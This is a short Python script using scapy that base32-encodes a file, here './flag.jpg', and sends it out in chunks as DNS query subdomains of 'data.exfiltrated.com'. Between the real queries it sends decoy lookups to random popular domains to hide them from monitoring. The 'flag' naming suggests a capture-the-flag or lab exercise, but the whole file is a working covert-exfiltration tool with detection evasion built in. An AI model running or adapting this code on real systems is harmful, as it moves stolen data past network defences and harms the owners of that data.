from scapy.all import *
import base64
import random
import string
from tranco import Tranco
import os


# Prepare random domains for DNS garbage
t = Tranco(cache=True, cache_dir='.tranco')
latest_list = t.list()
top_1k = latest_list.top(10000)


def generate_garbage_query():
    subdomain = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
    etld = random.choice(top_1k)
    return f"{subdomain}.{etld}"

def encode_data(filepath):
    with open(filepath, 'rb') as image_file:
        binary_data = image_file.read()

    encoded = base64.b32encode(binary_data).decode()
    chunks = [encoded[i:i+31] for i in range(0, len(encoded), 31)]
    print(chunks)
    return chunks

def send_query(query):
    dns_req = IP(dst='8.8.8.8')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=query))
    send(dns_req)

def exfiltrate_data(data):
    chunks = encode_data(data)
    for chunk in chunks:
        query = chunk + ".data.exfiltrated.com"
        send_query(query)
        # Send garbage queries to obfuscate the real ones
        for _ in range(random.randint(1, 5)):
            garbage_query = generate_garbage_query()
            send_query(garbage_query)

# data_to_exfiltrate = "this is a very long secret with secrets and is so secret! flag{123432423432324}"
# for i in range(0, 5):
#     print(generate_garbage_query())

filepath = './flag.jpg'
exfiltrate_data(filepath)
